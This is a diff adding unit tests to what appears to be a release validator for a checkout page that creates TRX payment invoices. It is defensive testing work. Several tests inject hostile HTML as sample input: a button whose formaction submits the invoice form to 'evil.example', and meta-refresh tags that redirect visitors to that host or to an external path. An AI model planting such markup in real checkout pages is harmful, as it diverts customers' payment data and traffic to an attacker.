@@ -774,6 +774,37 @@ class EmailFreeCheckoutReleaseTests(unittest.TestCase):
         with self.assertRaisesRegex(RuntimeError, "FORM_CONTRACT_LOST"):
             release.verify_template(duplicate)
 
+    def test_detached_external_submitter_cannot_claim_valid_checkout(self):
+        html = self._rendered_checkout(72) + (
+            b'<button form="invoice" formaction="https://evil.example/submit">'
+            b'Create my TRX payment invoice</button>')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_attached_submitter_inside_form_refused(self):
+        html = self._rendered_checkout(72).replace(
+            b'<button type="submit">',
+            b'<button type="submit" form="invoice">')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_meta_refresh_even_in_header_blocks_public_release(self):
+        html = self._rendered_checkout(72) + (
+            b'<meta http-equiv="refresh" content="0; URL=https://evil.example/">')
+        with self.assertRaisesRegex(RuntimeError, "LIVE_FORM_MALFORMED:72"):
+            release.verify_live_checkout_markup(html, 72)
+
+    def test_normal_no_refresh_meta_remains_acceptable(self):
+        html = self._rendered_checkout(72) + b'<meta charset="utf-8">'
+        self.assertEqual(
+            release.verify_live_checkout_markup(html, 72)["invoice_action"], "exact")
+
+    def test_template_rejects_meta_refresh_without_any_invoice_change(self):
+        source = release.patch_template(template())
+        with self.assertRaisesRegex(RuntimeError, "FORM_CONTRACT_LOST"):
+            release.verify_template(
+                source + b'<meta http-equiv="refresh" content="0;url=/external/">')
+
     def test_live_atelier_missing_csrf_is_a_release_block(self):
         html = self._rendered_checkout(879)
         html = html.replace(
